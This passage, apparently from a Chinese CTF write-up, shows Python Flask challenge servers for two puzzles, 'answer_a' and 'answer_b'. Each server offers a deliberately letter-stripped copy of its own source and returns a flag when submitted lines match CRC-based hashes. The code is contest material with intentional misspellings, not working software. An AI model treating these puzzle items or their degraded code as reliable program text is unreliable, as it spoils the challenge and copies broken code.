u1<span class="token punctuation">,</span> u0 <span class="token operator">=</span> <span class="token number">0xCb4EcdfD0A9F</span><span class="token punctuation">,</span> <span class="token number">0xa9dec1C1b7A3</span><span class="token punctuation">,</span> <span class="token number">0x60c4B0aAB4Bf</span>                     asert <span class="token punctuation">(</span>u2<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> u0<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">223539323800223</span><span class="token punctuation">,</span> <span class="token number">186774198532003</span><span class="token punctuation">,</span> <span class="token number">106397893833919</span><span class="token punctuation">)</span>      digest <span class="token operator">=</span> <span class="token punctuation">(</span>digest <span class="token operator">*</span> <span class="token punctuation">(</span>digest <span class="token operator">*</span> u2 <span class="token operator">+</span> u1<span class="token punctuation">)</span> <span class="token operator">+</span> u0<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">48</span><span class="token punctuation">)</span>                         <span class="token keyword">return</span> digest<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'litl'</span><span class="token punctuation">)</span>                                                                                                                                                                                                   <span class="token keyword">def</span> <span class="token function">xzrj</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>                                                    pat<span class="token punctuation">,</span> repl <span class="token operator">=</span> <span class="token string">rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?'</span><span class="token punctuation">,</span> <span class="token string">rb'\1'</span>                     <span class="token keyword">return</span> r<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pat<span class="token punctuation">,</span> repl<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>r<span class="token punctuation">.</span>IGNORECAS<span class="token punctuation">)</span>                                                                                                                                                                                        paths<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                                                                                                                         xzrj_bytes<span class="token punctuation">:</span> <span class="token builtin">bytes</span> <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                                                                                                                     <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__fil__<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                                                     <span class="token keyword">for</span> row <span class="token keyword">in</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                   row <span class="token operator">=</span> <span class="token punctuation">(</span>row<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b' '</span> <span class="token operator">*</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span>                                           path <span class="token operator">=</span> bas64<span class="token punctuation">.</span>b85encod<span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.txt'</span>                                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pf<span class="token punctuation">:</span>                                                        pf<span class="token punctuation">.</span>writ<span class="token punctuation">(</span>row<span class="token punctuation">)</span>                                                                   paths<span class="token punctuation">.</span>apend<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                                                              xzrj_bytes <span class="token operator">+=</span> xzrj<span class="token punctuation">(</span>row<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\r\n'</span>                                                                                                                       <span class="token keyword">def</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                                        <span class="token keyword">for</span> path <span class="token keyword">in</span> paths<span class="token punctuation">:</span>                                                                  <span class="token keyword">try</span><span class="token punctuation">:</span>                                                                                os<span class="token punctuation">.</span>remov<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                                                             <span class="token keyword">except</span> FileNotFoundEror<span class="token punctuation">:</span>                                                           pas                                                                                                                                                atexit<span class="token punctuation">.</span>register<span class="token punctuation">(</span>clean<span class="token punctuation">)</span>                                                                                                                                                                                                                      bp<span class="token punctuation">:</span> flask<span class="token punctuation">.</span>Blueprint <span class="token operator">=</span> flask<span class="token punctuation">.</span>Blueprint<span class="token punctuation">(</span><span class="token string">'answer_a'</span><span class="token punctuation">,</span> __nam__<span class="token punctuation">)</span>                                                                                                                                                                                     <span class="token decorator annotation punctuation">@bp<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">'/answer_a.py'</span><span class="token punctuation">)</span>                                                         <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> flask<span class="token punctuation">.</span>Respons<span class="token punctuation">:</span>                                                        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>Respons<span class="token punctuation">(</span>xzrj_bytes<span class="token punctuation">,</span> content_typ<span class="token operator">=</span><span class="token string">'text/plain; charset=UTF-8'</span><span class="token punctuation">)</span>                                                                                                                                                                 <span class="token decorator annotation punctuation">@bp<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/answer_a.py'</span><span class="token punctuation">)</span>                                                        <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> flask<span class="token punctuation">.</span>Respons<span class="token punctuation">:</span>                                                       wrong_hints <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                                                                req_lines <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span>                               <span class="token builtin">iter</span> <span class="token operator">=</span> enumerat<span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>zip_longest<span class="token punctuation">(</span>paths<span class="token punctuation">,</span> req_lines<span class="token punctuation">)</span><span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>              <span class="token keyword">for</span> index<span class="token punctuation">,</span> <span class="token punctuation">(</span>path<span class="token punctuation">,</span> req_row<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">iter</span><span class="token punctuation">:</span>                                                 <span class="token keyword">if</span> path <span class="token keyword">is</span> Non<span class="token punctuation">:</span>                                                                    wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Too many lines for request data'</span>                          <span class="token keyword">break</span>                                                                       <span class="token keyword">if</span> req_row <span class="token keyword">is</span> Non<span class="token punctuation">:</span>                                                                 wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Too few lines for request data'</span>                           <span class="token keyword">continue</span>                                                                    req_row_hash <span class="token operator">=</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>req_row<span class="token punctuation">)</span>                                                    req_row_path <span class="token operator">=</span> bas64<span class="token punctuation">.</span>b85encod<span class="token punctuation">(</span>req_row_hash<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.txt'</span>                         <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>req_row_path<span class="token punctuation">)</span><span class="token punctuation">:</span>                                                wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Unmatched hash (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req_row_hash<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span>                   <span class="token keyword">continue</span>                                                                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>req_row_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pf<span class="token punctuation">:</span>                                                row <span class="token operator">=</span> pf<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                                 <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req_row<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>                                                        wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Unmatched length (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>req_row<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span>                       <span class="token keyword">continue</span>                                                                    unmatched <span class="token operator">=</span> <span class="token punctuation">[</span>req_b <span class="token keyword">for</span> b<span class="token punctuation">,</span> req_b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> req_row<span class="token punctuation">)</span> <span class="token keyword">if</span> b <span class="token operator">!=</span> req_b<span class="token punctuation">]</span>             <span class="token keyword">if</span> unmatched<span class="token punctuation">:</span>                                                                       wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Unmatched data (0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>unmatched<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token format-spec">02X</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span>                  <span class="token keyword">continue</span>                                                                    <span class="token keyword">if</span> path <span class="token operator">!=</span> req_row_path<span class="token punctuation">:</span>                                                            wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Matched but in other lines'</span></span>                              <span class="token keyword">continue</span>                                                            <span class="token keyword">if</span> wrong_hints<span class="token punctuation">:</span>                                                                     <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'wrong_hints'</span><span class="token punctuation">:</span> wrong_hints<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>                                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'answer_a.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> af<span class="token punctuation">:</span>                                              answer_flag <span class="token operator">=</span> bas64<span class="token punctuation">.</span>b85decod<span class="token punctuation">(</span>af<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decod<span class="token punctuation">(</span><span class="token punctuation">)</span>                              closing<span class="token punctuation">,</span> opening <span class="token operator">=</span> answer_flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> answer_flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>                            asert closing <span class="token operator">==</span> <span class="token string">'&#125;'</span> <span class="token keyword">and</span> opening <span class="token operator">==</span> <span class="token string">'flag&#123;'</span>                                    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'answer_flag'</span><span class="token punctuation">:</span> answer_flag<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span>                                <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>送分，随便一补就好了。</p><h3 id="题目-B"><a href="#题目-B" class="headerlink" title="题目 B"></a>题目 B</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3                                                              </span>                                                                                <span class="token keyword">import</span> atexit<span class="token punctuation">,</span> bas64<span class="token punctuation">,</span> flask<span class="token punctuation">,</span> itertools<span class="token punctuation">,</span> os<span class="token punctuation">,</span> r                                                                                                                                                                                                 <span class="token keyword">def</span> <span class="token function">crc</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>                                                       poly<span class="token punctuation">,</span> poly_degree <span class="token operator">=</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token number">48</span>     asert <span class="token builtin">len</span><span class="token punctuation">(</span>poly<span class="token punctuation">)</span> <span class="token operator">==</span> poly_degree <span class="token operator">+</span> <span class="token number">1</span> <span class="token keyword">and</span> poly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> poly<span class="token punctuation">[</span>poly_degree<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'B'</span>     flip <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>poly<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> rang<span class="token punctuation">(</span>poly_degree<span class="token punctuation">)</span><span class="token punctuation">)</span>      digest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> poly_degree<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>                                                 <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">input</span><span class="token punctuation">:</span>                                                                     digest <span class="token operator">=</span> digest <span class="token operator">^</span> b                                                             <span class="token keyword">for</span> _ <span class="token keyword">in</span> rang<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                                  digest <span class="token operator">=</span> <span class="token punctuation">(</span>digest <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>flip <span class="token keyword">if</span> digest <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span> els <span class="token number">0</span><span class="token punctuation">)</span>               <span class="token keyword">return</span> digest <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> poly_degree<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>                                                                                                                                                                                                      <span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>                                                    digest <span class="token operator">=</span> crc<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>                                                             u2<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> u0 <span class="token operator">=</span> <span class="token number">0xdbeEaed4cF43</span><span class="token punctuation">,</span> <span class="token number">0xFDFECeBdeeD9</span><span class="token punctuation">,</span> <span class="token number">0xB7E85A4E5Dcd</span>                     asert <span class="token punctuation">(</span>u2<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> u0<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">241818181881667</span><span class="token punctuation">,</span> <span class="token number">279270832074457</span><span class="token punctuation">,</span> <span class="token number">202208575380941</span><span class="token punctuation">)</span>      digest <span class="token operator">=</span> <span class="token punctuation">(</span>digest <span class="token operator">*</span> <span class="token punctuation">(</span>digest <span class="token operator">*</span> u2 <span class="token operator">+</span> u1<span class="token punctuation">)</span> <span class="token operator">+</span> u0<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">48</span><span class="token punctuation">)</span>                         <span class="token keyword">return</span> digest<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">48</span> <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'litl'</span><span class="token punctuation">)</span>                                                                                                                                                                                                   <span class="token keyword">def</span> <span class="token function">xzrj</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>                                                    pat<span class="token punctuation">,</span> repl <span class="token operator">=</span> <span class="token string">rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?'</span><span class="token punctuation">,</span> <span class="token string">rb'\1'</span>                     <span class="token keyword">return</span> r<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pat<span class="token punctuation">,</span> repl<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>r<span class="token punctuation">.</span>IGNORECAS<span class="token punctuation">)</span>                                                                                                                                                                                        paths<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span><span class="token builtin">bytes</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                                                                                                                         xzrj_bytes<span class="token punctuation">:</span> <span class="token builtin">bytes</span> <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                                                                                                                     <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__fil__<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                                                     <span class="token keyword">for</span> row <span class="token keyword">in</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                   row <span class="token operator">=</span> <span class="token punctuation">(</span>row<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b' '</span> <span class="token operator">*</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">]</span>                                           path <span class="token operator">=</span> bas64<span class="token punctuation">.</span>b85encod<span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.txt'</span>                                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pf<span class="token punctuation">:</span>                                                        pf<span class="token punctuation">.</span>writ<span class="token punctuation">(</span>row<span class="token punctuation">)</span>                                                                   paths<span class="token punctuation">.</span>apend<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                                                              xzrj_bytes <span class="token operator">+=</span> xzrj<span class="token punctuation">(</span>row<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\r\n'</span>                                                                                                                       <span class="token keyword">def</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                                        <span class="token keyword">for</span> path <span class="token keyword">in</span> paths<span class="token punctuation">:</span>                                                                  <span class="token keyword">try</span><span class="token punctuation">:</span>                                                                                os<span class="token punctuation">.</span>remov<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                                                             <span class="token keyword">except</span> FileNotFoundEror<span class="token punctuation">:</span>                                                           pas                                                                                                                                                atexit<span class="token punctuation">.</span>register<span class="token punctuation">(</span>clean<span class="token punctuation">)</span>                                                                                                                                                                                                                      bp<span class="token punctuation">:</span> flask<span class="token punctuation">.</span>Blueprint <span class="token operator">=</span> flask<span class="token punctuation">.</span>Blueprint<span class="token punctuation">(</span><span class="token string">'answer_b'</span><span class="token punctuation">,</span> __nam__<span class="token punctuation">)</span>                                                                                                                                                                                     <span class="token decorator annotation punctuation">@bp<span class="token punctuation">.</span>get</span><span class="token punctuation">(</span><span class="token string">'/answer_b.py'</span><span class="token punctuation">)</span>                                                         <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> flask<span class="token punctuation">.</span>Respons<span class="token punctuation">:</span>                                                        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>Respons<span class="token punctuation">(</span>xzrj_bytes<span class="token punctuation">,</span> content_typ<span class="token operator">=</span><span class="token string">'text/plain; charset=UTF-8'</span><span class="token punctuation">)</span>                                                                                                                                                                 <span class="token decorator annotation punctuation">@bp<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/answer_b.py'</span><span class="token punctuation">)</span>                                                        <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> flask<span class="token punctuation">.</span>Respons<span class="token punctuation">:</span>                                                       wrong_hints <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                                                                req_lines <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span>                               <span class="token builtin">iter</span> <span class="token operator">=</span> enumerat<span class="token punctuation">(</span>itertools<span class="token punctuation">.</span>zip_longest<span class="token punctuation">(</span>paths<span class="token punctuation">,</span> req_lines<span class="token punctuation">)</span><span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>              <span class="token keyword">for</span> index<span class="token punctuation">,</span> <span class="token punctuation">(</span>path<span class="token punctuation">,</span> req_row<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">iter</span><span class="token punctuation">:</span>                                                 <span class="token keyword">if</span> path <span class="token keyword">is</span> Non<span class="token punctuation">:</span>                                                                    wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Too many lines for request data'</span>                          <span class="token keyword">break</span>                                                                       <span class="token keyword">if</span> req_row <span class="token keyword">is</span> Non<span class="token punctuation">:</span>                                                                 wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Too few lines for request data'</span>                           <span class="token keyword">continue</span>                                                                    req_row_hash <span class="token operator">=</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>req_row<span class="token punctuation">)</span>                                                    req_row_path <span class="token operator">=</span> bas64<span class="token punctuation">.</span>b85encod<span class="token punctuation">(</span>req_row_hash<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'.txt'</span>                         <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>req_row_path<span class="token punctuation">)</span><span class="token punctuation">:</span>                                                wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Unmatched hash (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req_row_hash<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span>                   <span class="token keyword">continue</span>                                                                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>req_row_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pf<span class="token punctuation">:</span>                                                row <span class="token operator">=</span> pf<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>                                                                 <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req_row<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>                                                        wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Unmatched length (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>req_row<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span>                       <span class="token keyword">continue</span>                                                                    unmatched <span class="token operator">=</span> <span class="token punctuation">[</span>req_b <span class="token keyword">for</span> b<span class="token punctuation">,</span> req_b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> req_row<span class="token punctuation">)</span> <span class="token keyword">if</span> b <span class="token operator">!=</span> req_b<span class="token punctuation">]</span>             <span class="token keyword">if</span> unmatched<span class="token punctuation">:</span>                                                                       wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Unmatched data (0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>unmatched<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token format-spec">02X</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span>                  <span class="token keyword">continue</span>                                                                    <span class="token keyword">if</span> path <span class="token operator">!=</span> req_row_path<span class="token punctuation">:</span>                                                            wrong_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'Matched but in other lines'</span></span>                              <span class="token keyword">continue</span>                                                            <span class="token keyword">if</span> wrong_hints<span class="token punctuation">:</span>                                                                     <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'wrong_hints'</span><span class="token punctuation">:</span> wrong_hints<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">400</span>                                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'answer_b.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> af<span class="token punctuation">:</span>                                              answer_flag <span class="token operator">=</span> bas64<span class="token punctuation">.</span>b85decod<span class="token punctuation">(</span>af<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decod<span class="token punctuation">(</span><span class="token punctuation">)</span>                              closing<span class="token punctuation">,</span> opening <span class="token operator">=</span> answer_flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> answer_flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>                            asert closing <span class="token operator">==</span> <span class="token string">'&#125;'</span> <span class="token keyword">and</span> opening <span class="token operator">==</span> <span class="token string">'flag&#123;'</span>                                    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'answer_flag'</span><span class="token punctuation">:</span> answer_flag<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span>                                <span aria-hidden="true" 